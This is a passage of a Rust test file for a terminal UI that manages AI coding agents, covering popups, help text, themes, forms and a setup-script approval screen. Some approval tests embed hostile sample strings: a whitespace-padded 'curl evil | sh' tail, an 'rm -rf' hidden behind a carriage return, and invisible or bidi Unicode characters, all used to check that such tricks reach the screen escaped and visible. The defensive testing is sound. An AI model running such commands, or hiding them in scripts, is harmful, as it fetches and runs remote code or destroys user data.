            .collect::<Vec<_>>()
            .join("\n")
    }

    /// The popup's text with borders and spacing removed, so a wrapped line reads as one.
    fn squeezed(text: &str) -> String {
        text.chars()
            .filter(|c| !c.is_whitespace() && *c != '│')
            .collect()
    }

    #[test]
    fn a_long_setup_line_wraps_so_its_tail_is_on_screen() {
        let script = format!("npm install{}; curl evil | sh", " ".repeat(200));
        let app = asking_to_run(&script, 0);
        for (width, height) in [(60, 20), (120, 40)] {
            let (text, _) = render_at(&app, width, height);
            assert!(
                squeezed(&text).contains("npminstall;curlevil|sh"),
                "{width}x{height}\n{text}"
            );
            assert!(text.contains("y run it and remember"), "{text}");
        }
    }

    #[test]
    fn invisible_characters_in_a_setup_script_are_shown_escaped() {
        let invisible = [
            '\u{ad}',
            '\u{61c}',
            '\u{180e}',
            '\u{200b}',
            '\u{202e}',
            '\u{2060}',
            '\u{2064}',
            '\u{2066}',
            '\u{206f}',
            '\u{feff}',
            '\u{fe0f}',
            '\u{e0100}',
            '\u{e01ef}',
            '\u{e0001}',
            '\u{e007f}',
        ];
        let script: String = invisible.iter().flat_map(|c| ['x', *c]).collect();
        let app = asking_to_run(&script, 0);
        let (text, _) = render_at(&app, 120, 20);
        for c in invisible {
            assert!(!text.contains(c), "{c:?} reached the screen\n{text}");
            assert!(
                text.contains(&c.escape_unicode().to_string()),
                "{c:?}\n{text}"
            );
        }
    }

    #[test]
    fn a_backslash_in_a_setup_script_is_doubled_so_it_differs_from_an_escape() {
        let app = asking_to_run(r"echo \r \\ \u{1b}", 0);
        let (text, _) = render_at(&app, 80, 20);
        assert!(text.contains(r"echo \\r \\\\ \\u{1b}"), "{text}");
    }

    #[test]
    fn a_screen_too_small_for_the_setup_script_says_so_instead_of_showing_part_of_it() {
        let mut app = asking_to_run("npm install", 0);
        if let Some(Popup::ApproveSetup { project, .. }) = &mut app.popup {
            *project = format!("/w/{}", "deep/".repeat(60)).into();
        }
        let (text, _) = render_at(&app, 60, 12);
        assert!(text.contains("too small to show the script"), "{text}");
        assert!(!text.contains("npm install"), "{text}");
    }

    #[test]
    fn the_scroll_hint_offers_skipping() {
        let app = asking_to_run(&tall_setup(), 0);
        let (text, _) = render_at(&app, 80, 20);
        assert!(text.contains("s skip it"), "{text}");
    }

    #[test]
    fn control_characters_in_a_setup_script_are_shown_escaped() {
        let app = asking_to_run("echo a\rrm -rf x\tb\u{1b}[2J", 0);
        let (text, _) = render_at(&app, 80, 20);
        assert!(text.contains(r"echo a\rrm -rf x\tb\u{1b}[2J"), "{text}");
        assert!(
            !text.contains(|c: char| c.is_control() && c != '\n'),
            "{text:?}"
        );
    }

    #[test]
    fn a_tall_setup_script_scrolls_and_keeps_its_hint_on_screen() {
        for (width, height) in [(60, 20), (120, 40)] {
            let app = asking_to_run(&tall_setup(), 0);
            let (text, _) = render_at(&app, width, height);
            assert!(text.contains("echo step 1 "), "{text}");
            assert!(!text.contains("echo step 40"), "{text}");
            assert!(text.contains("↓"), "{text}");
            assert!(!text.contains("↑"), "{text}");
            assert!(
                text.contains("scroll to the end to approve"),
                "{width}x{height}\n{text}"
            );
            assert!(!text.contains("y run it"), "{text}");

            let app = asking_to_run(&tall_setup(), 100);
            let (text, _) = render_at(&app, width, height);
            assert!(text.contains("echo step 40"), "{text}");
            assert!(text.contains("↑") && !text.contains("↓"), "{text}");
            assert!(
                text.contains("y run it and remember"),
                "{width}x{height}\n{text}"
            );
        }
    }

    #[test]
    fn an_unseen_finished_agent_is_listed_as_done() {
        let p = project("p");
        let a = agent(&p, "alpha", Status::Idle);
        let b = agent(&p, "beta", Status::Working);
        let (mut app, _) = loaded(vec![p], vec![a, b.clone()]);
        let _ = app.apply_server(protocol::ServerMessage::AgentUpdated(AgentInfo {
            status: Status::Idle,
            ..b
        }));
        let (text, buffer) = render(&app);
        assert!(text.contains("● beta  done"), "{text}");
        let dot = find_text(&buffer, buffer.area, "● beta");
        assert_eq!(buffer[dot].fg, DONE_BLUE);
        assert!(text.contains("● alpha  idle"), "{text}");
    }

    #[test]
    fn statuses_are_dots_in_github_colours() {
        let theme = Theme::default();
        let dot = |status| glyph(status, 0, &theme);
        assert_eq!(dot(Status::Idle), ("●", Style::new().fg(IDLE_GREEN)));
        assert_eq!(
            dot(Status::NeedsInput),
            ("●", Style::new().fg(NEEDS_PURPLE))
        );
        assert_eq!(dot(Status::Exited(1)), ("●", Style::new().fg(ERROR_RED)));
        assert_eq!(dot(Status::Exited(0)), ("●", Style::new().fg(theme.dim)));
        assert_eq!(dot(Status::Stopped), ("○", Style::new().fg(theme.dim)));
        assert_eq!(dot(Status::Starting).0, "○");
    }

    #[test]
    fn working_dot_pulses_from_yellow_to_orange_and_back() {
        let theme = Theme::default();
        let colour = |tick| glyph(Status::Working, tick, &theme).1.fg;
        assert_eq!(glyph(Status::Working, 0, &theme).0, "●");
        assert_eq!(colour(0), Some(WORKING_YELLOW));
        assert_eq!(colour(PULSE_TICKS / 2), Some(WORKING_ORANGE));
        assert_eq!(colour(PULSE_TICKS), Some(WORKING_YELLOW));
        let steps: Vec<_> = (0..PULSE_TICKS).map(colour).collect();
        assert!(
            steps.windows(2).all(|w| w[0] != w[1]),
            "every tick moves: {steps:?}"
        );
        let custom = Theme {
            working: Color::Cyan,
            ..Theme::default()
        };
        for tick in 0..PULSE_TICKS {
            assert_eq!(
                glyph(Status::Working, tick, &custom).1.fg,
                Some(Color::Cyan)
            );
        }
    }

    #[test]
    fn working_agents_animate_and_all_view_shows_projects() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "busy", Status::Working)]);
        assert!(app.animating());
        let (text, _) = render(&app);
        assert!(
            text.contains("● busy  working") && text.contains(" Agents "),
            "{text}"
        );
        app.view = crate::app::AgentView::All;
        let (text, _) = render(&app);
        assert!(
            text.contains(" Agents · all ") && text.contains("p/busy"),
            "{text}"
        );
    }

    #[test]
    fn sidebar_titles_name_the_digit_that_focuses_them() {
        let p = project("p");
        let agents = vec![agent(&p, "a", Status::Idle)];
        let (mut app, _) = loaded(vec![p.clone()], agents.clone());
        let (text, _) = render(&app);
        assert!(text.contains("╭ [1] Projects ─"), "{text}");
        assert!(text.contains("╭ [2] Agents ─"), "{text}");
        app.view = crate::app::AgentView::All;
        let (text, _) = render(&app);
        assert!(text.contains("╭ [2] Agents · all ─"), "{text}");

        let config =
            "[keys.sidebar]\nfocus_projects = [\"p\", \"ctrl-3\"]\nfocus_agents = [\"l\", \"9\"]\n";
        let (app, _) = loaded_with(configured(config), vec![p], agents);
        let (text, _) = render(&app);
        assert!(text.contains("╭ Projects ─"), "{text}");
        assert!(text.contains("╭ [9] Agents ─"), "{text}");
    }

    #[test]
    fn status_bar_shows_messages_then_hints() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("? help · q quit · enter open · n new · x stop"),
            "{status}"
        );
        app.fail("boom happened");
        let (text, _) = render(&app);
        assert!(text.contains("boom happened"), "{text}");
        app.focus = Focus::Pane;
        app.message = None;
        let (text, _) = render(&app);
        assert!(text.contains("ctrl-q q/esc sidebar"), "{text}");
    }

    #[test]
    fn status_bar_keeps_the_hint_after_a_red_message() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.fail("boom happened");
        let (text, buffer) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("boom happened │ ? help · q quit · enter open"),
            "{status}"
        );
        assert!(!status.contains("g next input"), "{status}");
        let y = buffer.area.height - 1;
        assert_eq!(buffer[(0, y)].fg, ERROR_RED);
        assert_eq!(buffer[(12, y)].fg, ERROR_RED);
        assert_eq!(buffer[(16, y)].fg, Color::DarkGray);
        app.focus = Focus::Pane;
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("boom happened │ ctrl-q q/esc sidebar"),
            "{status}"
        );
    }

    #[test]
    fn a_copy_reports_itself_in_the_accent_colour() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        let mut screen = Screen::blank(20, 1);
        for (cell, c) in screen.lines[0].iter_mut().zip("hello".chars()) {
            cell.text = c.to_string();
        }
        app.screen = screen;
        let areas = layout(Rect::new(0, 0, 100, 30), &app);
        let (x, y) = (areas.pane_inner.x, areas.pane_inner.y);
        let mouse = |kind, col| MouseInput { kind, col, row: y };
        let _ = app.on_mouse(mouse(MouseKind::Down, x), &areas);
        let _ = app.on_mouse(mouse(MouseKind::Drag, x + 2), &areas);
        let effects = app.on_mouse(mouse(MouseKind::Up, x + 2), &areas);
        assert_eq!(effects, vec![Effect::Copy("hel".into())]);
        let (text, buffer) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(status.starts_with("copied 3 characters │"), "{status}");
        let row = buffer.area.height - 1;
        assert_eq!(buffer[(0, row)].fg, app.theme.accent);
        assert_ne!(app.theme.accent, app.theme.attention);
    }

    #[test]
    fn scroll_mode_colours_the_pane_border_and_shows_its_hint() {
        let p = project("p");
        let a = agent(&p, "a", Status::Idle);
        let (mut app, _) = loaded(vec![p.clone()], vec![a]);
        let _ = app.on_key(KeyEvent::new(KeyCode::Char('s'), KeyModifiers::NONE));
        let (text, buffer) = render(&app);
        let pane = layout(Rect::new(0, 0, 100, 30), &app).pane;
        assert_eq!(buffer[(pane.x, pane.y)].fg, Color::Yellow);
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("SCROLL · q/esc exit · j/k move · ctrl-d/ctrl-u half page"),
            "{status}"
        );

        let config = configured("[theme]\nscroll = \"blue\"\n");
        let (mut app, _) = loaded_with(config, vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        let _ = app.on_key(KeyEvent::new(KeyCode::Char('s'), KeyModifiers::NONE));
        let (_, buffer) = render(&app);
        assert_eq!(buffer[(pane.x, pane.y)].fg, Color::Blue);
    }

    #[test]
    fn status_bar_shows_the_pending_prefix() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.focus = Focus::Pane;
        app.prefix_pending = true;
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(status.starts_with("ctrl-q …"), "{status}");
        assert!(!status.contains("sidebar"), "{status}");
    }

    fn known(name: &str, path: &str) -> KnownProject {
        KnownProject {
            name: name.into(),
            path: path.into(),
        }
    }

    #[test]
    fn picker_lists_known_projects_with_home_as_tilde() {
        let (mut app, _) = loaded(Vec::new(), Vec::new());
        app.known = vec![known("web", "/home/u/git/web"), known("old", "/srv/old")];
        app.popup = Some(Popup::ProjectPicker { index: 1 });
        let (text, buffer) = render(&app);
        assert!(text.contains("+ new project"), "{text}");
        assert!(text.contains("web  ~/git/web"), "{text}");
        assert!(text.contains("old  /srv/old"), "{text}");
        assert!(text.contains("x forget"), "{text}");
        let marker = find_text(&buffer, buffer.area, "▸ web");
        assert_selected(&buffer[marker], app.theme.selected);
        let other = find_text(&buffer, buffer.area, "old  /srv/old");
        assert_eq!(buffer[other].bg, Color::Reset);
    }

    fn assert_selected(cell: &ratatui::buffer::Cell, bg: Color) {
        assert_eq!(cell.bg, bg, "{cell:?}");
        assert!(cell.modifier.contains(Modifier::BOLD), "{cell:?}");
        assert!(!cell.modifier.contains(Modifier::REVERSED), "{cell:?}");
    }

    fn assert_nothing_reversed(buffer: &Buffer) {
        let reversed = buffer
            .content
            .iter()
            .any(|cell| cell.modifier.contains(Modifier::REVERSED));
        assert!(!reversed, "{buffer:?}");
    }

    /// The cursor's position when the frame leaves it visible.
    fn cursor_of(app: &App) -> (Buffer, Option<(u16, u16)>) {
        let mut terminal = Terminal::new(TestBackend::new(100, 30)).expect("terminal");
        let areas = layout(Rect::new(0, 0, 100, 30), app);
        terminal
            .draw(|f| draw(f, app, &areas, Instant::now(), 0))
            .expect("draw");
        let backend = terminal.backend();
        let cursor = backend.cursor_visible().then(|| {
            let at = backend.cursor_position();
            (at.x, at.y)
        });
        (backend.buffer().clone(), cursor)
    }

    #[test]
    fn selected_rows_keep_their_colours_and_only_the_focused_box_gets_a_background() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        let layout = layout(Rect::new(0, 0, 100, 30), &app);
        let (_, buffer) = render(&app);
        let dot = find_text(&buffer, layout.agents, "● a");
        assert_eq!(buffer[dot].fg, IDLE_GREEN);
        assert_selected(&buffer[dot], Color::Blue);
        let project = find_text(&buffer, layout.projects, "▸ p");
        assert_eq!(buffer[project].bg, Color::Reset);
        assert!(buffer[project].modifier.contains(Modifier::BOLD));
        assert_nothing_reversed(&buffer);

        app.focus = Focus::Projects;
        let (_, buffer) = render(&app);
        assert_selected(&buffer[project], Color::Blue);
        assert_eq!(buffer[dot].bg, Color::Reset);
        assert_eq!(buffer[dot].fg, IDLE_GREEN);
    }

    #[test]
    fn text_fields_show_the_cursor_instead_of_a_highlight() {
        let (mut app, _) = loaded(Vec::new(), Vec::new());
        app.popup = Some(Popup::AddProject(ProjectForm {
            path: "/x/repo".into(),
            name: String::new(),
            field: ProjectField::Path,
            submission: Default::default(),
        }));
        let (buffer, cursor) = cursor_of(&app);
        assert_nothing_reversed(&buffer);
        let path = find_text(&buffer, buffer.area, "Path: /x/repo");
        assert_eq!(buffer[path].fg, app.theme.accent);
        assert!(buffer[path].modifier.contains(Modifier::BOLD));
        assert_eq!(
            cursor,
            Some((path.0 + "Path: /x/repo".len() as u16, path.1))
        );

        app.popup = Some(Popup::AddProject(ProjectForm {
            path: "/x/repo".into(),
            name: "web".into(),
            field: ProjectField::Name,
            submission: Default::default(),
        }));
        let (buffer, cursor) = cursor_of(&app);
        let name = find_text(&buffer, buffer.area, "Name: web");
        assert_eq!(buffer[path].fg, Color::Reset);
        assert_eq!(cursor, Some((name.0 + "Name: web".len() as u16, name.1)));

        let agent_id = protocol::AgentId::random();
        app.popup = Some(Popup::Rename {
            agent: agent_id,
            input: "abc".into(),
            submission: Default::default(),
        });
        let (buffer, cursor) = cursor_of(&app);
        let rename = find_text(&buffer, buffer.area, "Name: abc");
        assert_eq!(
            cursor,
            Some((rename.0 + "Name: abc".len() as u16, rename.1))
        );
    }

    #[test]
    fn new_agent_form_has_a_cursor_only_on_text_fields() {
        let (mut app, _) = loaded(vec![project("p")], Vec::new());
        let mut form = NewAgentForm {
            name: "bot".into(),
            preset: Preset::Claude,
            command: String::new(),
            worktree: false,
            base: String::new(),
            prompt: String::new(),
            field: Field::Name,
            submission: Default::default(),
            outside_git: false,
        };
        app.popup = Some(Popup::NewAgent(form.clone()));
        let (buffer, cursor) = cursor_of(&app);
        assert_nothing_reversed(&buffer);
        let name = find_text(&buffer, buffer.area, "Name:    bot");
        assert_eq!(cursor, Some((name.0 + "Name:    bot".len() as u16, name.1)));

        form.field = Field::Preset;
        app.popup = Some(Popup::NewAgent(form));
        let (buffer, cursor) = cursor_of(&app);
        assert_eq!(cursor, None);
        let preset = find_text(&buffer, buffer.area, "Preset:");
        assert_eq!(buffer[preset].fg, app.theme.accent);
        assert_nothing_reversed(&buffer);
    }

    #[test]
    fn picker_scrolls_to_keep_the_highlight_visible() {
        let (mut app, _) = loaded(Vec::new(), Vec::new());
        app.known = (0..40)
            .map(|i| known(&format!("proj{i}"), &format!("/p/{i}")))
            .collect();
        app.popup = Some(Popup::ProjectPicker { index: 35 });
        let (text, _) = render(&app);
        assert!(text.contains("proj34"), "{text}");
        assert!(!text.contains("+ new project"), "{text}");
    }

    #[test]
    fn popups_render_their_content() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.popup = Some(Popup::Confirm {
            prompt: "Stop a?".into(),
            action: crate::app::Confirmed::StopDaemon,
        });
        let (text, _) = render(&app);
        assert!(
            text.contains("Stop a?") && text.contains("y/enter confirm"),
            "{text}"
        );
        app.popup = Some(Popup::AddProject(ProjectForm {
            path: "/x/repo".into(),
            name: String::new(),
            field: ProjectField::Path,
            submission: Default::default(),
        }));
        let (text, _) = render(&app);
        assert!(
            text.contains(" Add project ")
                && text.contains("Path: /x/repo")
                && text.contains("Name: (directory name)")
                && text.contains("enter add"),
            "{text}"
        );
        app.popup = Some(Popup::Help);
        let (text, _) = render(&app);
        assert!(text.contains(" Help ") && text.contains("ctrl-]"), "{text}");
    }

    fn help_row(key: &str, action: &str) -> String {
        format!("  {key:<29}{action}")
    }

    #[test]
    fn help_lists_every_binding_at_100x30() {
        let mut app = App::new("/w".into(), "/bin/sh".into(), None, Config::default());
        app.popup = Some(Popup::Help);
        let (text, _) = render(&app);
        for (key, action) in [
            ("j/down, k/up", "move down / up in the focused box"),
            ("h/left/backtab/1, l/right/2", "focus Projects / Agents"),
            ("tab", "switch between Projects and Agents"),
            ("enter", "open the agent's pane"),
            ("n", "new agent"),
            ("x, r", "stop / restart agent"),
            ("c", "custom commands"),
            ("d, R", "remove / rename agent"),
            ("+", "wider pane / full screen / normal"),
            ("a", "add project"),
            ("A", "all agents / this project"),
            ("g", "next agent needing input, then next done"),
            ("/", "filter the agents (esc clears)"),
            (
                "J/pagedown, K/pageup",
                "scroll the agent's pane down / up from here",
            ),
            ("?", "help"),
            (
                "q/ctrl-c, Q",
                "quit (agents keep running) / stop the daemon too",
            ),
            ("y, N, i", "approve / deny / reply to the agent"),
            ("ctrl-q q/esc", "back to the sidebar"),
            ("ctrl-]/ctrl-5", "back to the sidebar"),
            ("ctrl-q j", "next agent"),
            ("ctrl-q k", "previous agent"),
            ("s", "scroll the agent's history"),
            ("ctrl-q s", "scroll the agent's history"),
            ("ctrl-q ctrl-q", "send ctrl-q to the agent"),
        ] {
            let expected = help_row(key, action);
            assert!(text.contains(&expected), "missing {expected:?}\n{text}");
        }
    }

    fn configured(text: &str) -> Config {
        crate::config::parse(text).expect("config parses")
    }

    fn line_with<'a>(text: &'a str, needle: &str) -> &'a str {
        text.lines()
            .find(|line| line.contains(needle))
            .unwrap_or_else(|| panic!("no line with {needle:?}\n{text}"))
    }

    fn column(line: &str, needle: &str) -> usize {
        let byte = line.find(needle).expect("needle in line");
        line[..byte].chars().count()
    }

    #[test]
    fn help_reflects_configured_keys() {
        let config = configured(
            r#"
            [keys.sidebar]
            new_agent = ["M", "ctrl-n"]
            quit = "ctrl-x"
            add_project = "P"

            [keys.pane]
            prefix = "ctrl-a"
            leave = ["x"]
            direct_next = "ctrl-j"
            direct_previous = "ctrl-k"
            "#,
        );
        let p = project("p");
        let (mut app, _) = loaded_with(config, vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.popup = Some(Popup::Help);
        let (text, _) = render_at(&app, 100, 40);
        for (key, action) in [
            ("M/ctrl-n", "new agent"),
            ("ctrl-x, Q", "quit (agents keep running)"),
            ("ctrl-a x", "back to the sidebar"),
            ("ctrl-a j", "next agent"),
            ("ctrl-j", "next agent"),
            ("ctrl-k", "previous agent"),
            ("ctrl-a ctrl-a", "send ctrl-a to the agent"),
        ] {
            assert!(
                line_with(&text, &format!("{key} ")).contains(action),
                "{key} {action}\n{text}"
            );
        }
        assert!(!text.contains("ctrl-q"), "{text}");

        app.popup = None;
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("? help · ctrl-x quit · enter open · M new · x stop"),
            "{status}"
        );
        assert!(status.contains("P add project"), "{status}");
        app.focus = Focus::Pane;
        let (text, _) = render(&app);
        let status = text.lines().last().expect("status line");
        assert!(
            status.starts_with("ctrl-a x sidebar · ctrl-a j next agent"),
            "{status}"
        );

        let (app, _) = loaded_with(
            configured("[keys.sidebar]\nadd_project = \"P\"\nnew_agent = \"N\"\n"),
            vec![],
            vec![],
        );
        let (text, _) = render(&app);
        assert!(text.contains("press P to add a project"), "{text}");
        assert!(text.contains("press N to start an agent"), "{text}");
        let (app, _) = loaded_with(
            configured("[keys.sidebar]\nnew_agent = \"N\"\n"),
            vec![project("p")],
            vec![],
        );
        let (text, _) = render(&app);
        assert!(text.contains("no agents — press N"), "{text}");
    }

    #[test]
    fn help_key_column_fits_the_widest_binding() {
        let config = configured("[keys.pane]\nleave = [\"q\", \"esc\", \"ctrl-alt-backspace\"]\n");
        let mut app = App::new("/w".into(), "/bin/sh".into(), None, config);
        app.popup = Some(Popup::Help);
        let (text, _) = render(&app);
        let widest = line_with(&text, "ctrl-q q/esc/ctrl-alt-backspace");
        let start = column(widest, "back to the sidebar");
        assert_eq!(
            start,
            column(widest, "ctrl-q q/esc/ctrl-alt-backspace")
                + "ctrl-q q/esc/ctrl-alt-backspace  ".len(),
            "{text}"
        );
        for (key, action) in [
            ("n ", "new agent"),
            ("ctrl-q ctrl-q", "send ctrl-q to the agent"),
            ("h/left/backtab/1", "focus Projects"),
        ] {
            assert_eq!(
                column(line_with(&text, action), action),
                start,
                "{key}\n{text}"
            );
        }
    }

    fn find_text(buffer: &Buffer, area: Rect, text: &str) -> (u16, u16) {
        for y in area.top()..area.bottom() {
            let row: String = (area.left()..area.right())
                .map(|x| buffer[(x, y)].symbol())
                .collect();
            if let Some(index) = row.find(text) {
                return (area.x + row[..index].chars().count() as u16, y);
            }
        }
        panic!("{text:?} not found in {area:?}");
    }

    #[test]
    fn theme_colours_apply() {
        let config = configured(
            r#"
            [theme]
            accent = "blue"
            attention = "magenta"
            error = "light-red"
            working = "cyan"
            idle = "light-green"
            dim = "white"
            border = "gray"
            "#,
        );
        let p = project("p");
        let (mut app, _) = loaded_with(
            config,
            vec![p.clone()],
            vec![
                agent(&p, "a1", Status::NeedsInput),
                agent(&p, "a2", Status::Working),
                agent(&p, "a3", Status::Idle),
                agent(&p, "a4", Status::Stopped),
                agent(&p, "a5", Status::Exited(1)),
            ],
        );
        let (_, buffer) = render(&app);
        let layout = layout(Rect::new(0, 0, 100, 30), &app);
        let fg = |(x, y): (u16, u16)| buffer[(x, y)].fg;
        assert_eq!(fg((layout.agents.x, layout.agents.y)), Color::Blue);
        assert_eq!(fg((layout.projects.x, layout.projects.y)), Color::Gray);
        assert_eq!(fg((layout.pane.x, layout.pane.y)), Color::Gray);
        assert_eq!(fg((layout.info.x, layout.info.y)), Color::Gray);

        let dot = |name: &str| {
            let (x, y) = find_text(&buffer, layout.agents, name);
            (x - 2, y)
        };
        assert_eq!(fg(dot("a1")), Color::Magenta);
        assert_eq!(fg((dot("a1").0 + 2, dot("a1").1)), Color::Magenta);
        assert_eq!(fg(dot("a2")), Color::Cyan);
        assert_eq!(fg(dot("a3")), Color::LightGreen);
        assert_eq!(fg(dot("a4")), Color::White);
        assert_eq!(fg(dot("a5")), Color::LightRed);
        assert_eq!(
            fg(find_text(&buffer, layout.projects, "● 1")),
            Color::Magenta
        );
        assert_eq!(fg((0, layout.status.y)), Color::White);

        app.fail("boom");
        let (_, buffer) = render(&app);
        assert_eq!(buffer[(0, layout.status.y)].fg, Color::LightRed);
        assert_eq!(buffer[(5, layout.status.y)].fg, Color::White);

        app.message = None;
        app.focus = Focus::Pane;
        app.prefix_pending = true;
        let (_, buffer) = render(&app);
        assert_eq!(buffer[(layout.pane.x, layout.pane.y)].fg, Color::Blue);
        assert_eq!(buffer[(layout.agents.x, layout.agents.y)].fg, Color::Gray);
        assert_eq!(buffer[(0, layout.status.y)].fg, Color::Cyan);
    }

    #[test]
    fn tiny_terminals_show_a_notice_instead_of_the_layout() {
        let p = project("p");
        let (mut app, _) = loaded(vec![p.clone()], vec![agent(&p, "a", Status::Idle)]);
        app.popup = Some(Popup::Help);
        let (text, _) = render_at(&app, 40, 6);
        assert!(text.contains("terminal too small"), "{text}");
        assert!(!text.contains(" Projects "), "{text}");
        let (text, _) = render_at(&app, 10, 3);
        assert!(
            text.contains("terminal") && text.contains("too small"),
            "{text}"
        );
        let _ = render_at(&app, 1, 1);
        let _ = render_at(&app, 0, 0);
        let (text, _) = render_at(&app, 46, 8);
        assert!(text.contains(" Help "), "{text}");
    }

    #[test]
    fn a_waiting_form_shows_no_text_cursor() {
        use crate::app::{NewAgentForm, Submission};
        let (mut app, _) = loaded(vec![project("p")], Vec::new());
        let sending = || Submission::Sending(Box::new(protocol::Request::ListAgents));
        app.popup = Some(Popup::NewAgent(NewAgentForm {
            name: "api".into(),
            submission: sending(),
            ..Default::default()
        }));
        assert_eq!(cursor_of(&app).1, None);
        app.popup = Some(Popup::Rename {
            agent: protocol::AgentId::random(),
            input: "api".into(),
            submission: sending(),
        });
        assert_eq!(cursor_of(&app).1, None);
        app.popup = Some(Popup::AddProject(ProjectForm {
            path: "/x".into(),
            name: String::new(),
            field: ProjectField::Path,
            submission: sending(),
        }));
        assert_eq!(cursor_of(&app).1, None);
    }

    #[test]
    fn the_worktree_row_says_why_a_project_outside_git_has_none() {
        use crate::app::NewAgentForm;
        let (mut app, _) = loaded(vec![project("p")], Vec::new());
        app.popup = Some(Popup::NewAgent(NewAgentForm {
            outside_git: true,
            ..Default::default()
        }));
        let (_, buffer) = render(&app);
        let at = find_text(&buffer, buffer.area, "Worktree: off (not a git repository)");
        assert_eq!(buffer[at].fg, app.theme.dim);
    }

    #[test]
    fn a_form_shows_its_error_in_words_and_says_while_it_waits() {
        use crate::app::{NewAgentForm, Submission};
        let (mut app, _) = loaded(vec![project("p")], Vec::new());
        let error = "branch lazyagents/api already exists; delete it or choose another agent name";
        app.popup = Some(Popup::NewAgent(NewAgentForm {
            name: "api".into(),
            submission: Submission::Failed(error.into()),
            ..Default::default()
        }));
        let (text, buffer) = render(&app);
        assert!(
            text.contains("branch lazyagents/api already exists; delete it or"),
            "{text}"
        );
        assert!(text.contains("│choose another agent name"), "{text}");
        let at = find_text(&buffer, buffer.area, "branch lazyagents/api");
        assert_eq!(buffer[at].fg, app.theme.error);
        assert!(text.contains(FORM_HINT), "{text}");

        app.popup = Some(Popup::NewAgent(NewAgentForm {
            submission: Submission::Sending(Box::new(protocol::Request::ListAgents)),
            ..Default::default()
        }));
        let (text, _) = render(&app);
        assert!(text.contains(SENDING_HINT), "{text}");
        assert!(!text.contains(FORM_HINT), "{text}");

        app.popup = Some(Popup::Rename {
            agent: protocol::AgentId::random(),
            input: "api".into(),
            submission: Submission::Failed("an agent named api already exists".into()),
        });
        let (text, _) = render(&app);
        assert!(text.contains("an agent named api already exists"), "{text}");

        app.popup = Some(Popup::AddProject(ProjectForm {
            path: "/nowhere".into(),
            name: String::new(),
            field: ProjectField::Path,
            submission: Submission::Failed("/nowhere: no such directory".into()),
        }));
        let (text, _) = render(&app);
        assert!(text.contains("/nowhere: no such directory"), "{text}");
    }

    #[test]
    fn new_agent_form_shows_command_only_for_custom() {
        use crate::app::{Field, NewAgentForm, Preset};
        let p = project("p");
        let (mut app, _) = loaded(vec![p], vec![]);
        let form = |preset| NewAgentForm {
            name: "api".into(),
            preset,
            command: "make".into(),
            worktree: false,
            base: String::new(),
            prompt: String::new(),
            field: Field::Name,
            submission: Default::default(),
            outside_git: false,
        };
        app.popup = Some(Popup::NewAgent(form(Preset::Claude)));
        let (text, _) = render(&app);
        assert!(
            text.contains("Name:    api")
                && text.contains("‹ claude ›")
                && !text.contains("Command:"),
            "{text}"
        );
        app.popup = Some(Popup::NewAgent(form(Preset::Custom)));
        let (text, _) = render(&app);
        assert!(text.contains("Command: make"), "{text}");
    }

    #[test]
    fn render_screen_maps_cells_and_clips() {
        let mut screen = Screen::blank(4, 2);
        screen.lines[0][0] = Cell {
            text: "日".into(),
            fg: ScreenColor::Indexed(1),
            bg: ScreenColor::Rgb(1, 2, 3),
            style: ScreenStyle {
                bold: true,
                ..ScreenStyle::default()
            },
        };
        screen.lines[0][1].text = String::new();
        screen.lines[0][2].text = "b".into();
        screen.lines[1].truncate(1);
        screen.cursor = Some((2, 0));
        let mut buf = Buffer::empty(Rect::new(0, 0, 10, 3));
        let cursor = render_screen(&screen, Rect::new(1, 1, 3, 1), &mut buf);
        assert_eq!(buf[(1, 1)].symbol(), "日");
        assert_eq!(buf[(1, 1)].fg, ratatui::style::Color::Indexed(1));
        assert_eq!(buf[(1, 1)].bg, ratatui::style::Color::Rgb(1, 2, 3));
        assert!(
            buf[(1, 1)]
                .modifier
                .contains(ratatui::style::Modifier::BOLD)
        );
        assert_eq!(buf[(3, 1)].symbol(), "b");
        assert_eq!(buf[(4, 1)].symbol(), " ");
        assert_eq!(cursor, Some(ratatui::layout::Position::new(3, 1)));
    }

    #[test]
    fn info_shows_branch_and_stats() {
        let p = project("p");
        let plain = agent(&p, "plain", Status::Idle);
        let wt = worktree_agent(&p, "wt");
        let (mut app, _) = loaded(vec![p], vec![plain.clone(), wt.clone()]);
        let stat = |insertions, uncommitted| GitStat {
            insertions,
            deletions: 1,
            files: 2,
            uncommitted,
        };
        let info = |app: &App| {
            let (text, _) = render(app);
            let layout = layout(Rect::new(0, 0, 100, 30), app);
            text.lines()
                .skip(usize::from(layout.info.y))
                .take(usize::from(layout.info.height))
                .map(|line| line.chars().take(usize::from(layout.info.width)).collect())
                .collect::<Vec<String>>()
                .join("\n")
        };

        let text = info(&app);
        assert!(
            !text.contains("files") && !text.contains("branch"),
            "{text}"
        );
        app.apply_git_stat(plain.id, Ok(stat(3, 4)));
        let text = info(&app);
        assert!(text.contains("changes +3 −1"), "{text}");
        assert!(text.contains("4 uncommitted"), "{text}");
        assert!(!text.contains("branch"), "{text}");

        let _ = app.on_key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE));
        let text = info(&app);
        assert!(text.contains("branch  lazyagents/wt"), "{text}");
        assert!(!text.contains("files"), "{text}");
        app.apply_git_stat(wt.id, Ok(stat(10, 1)));
        let text = info(&app);
